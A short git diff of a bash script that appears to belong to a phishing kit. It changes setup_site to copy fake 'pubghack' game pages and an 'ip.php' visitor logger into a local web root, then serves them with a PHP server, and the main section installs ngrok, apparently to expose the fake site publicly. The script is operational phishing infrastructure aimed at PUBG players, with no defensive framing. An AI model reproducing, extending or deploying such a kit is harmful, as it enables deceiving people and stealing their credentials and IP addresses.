@@ -202,8 +202,8 @@ PORT='8080'
 
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-	cp -rf pubg/"$website"/* .server/www
-	cp -f pubg/ip.php .server/www/
+        cp -rf pubghack/"$website"/* .server/www
+        cp -f pubghack/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
@@ -356,7 +356,6 @@ ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 }
 
 ## Main
-SSLRI
 dependencies
 install_ngrok
 main_menu
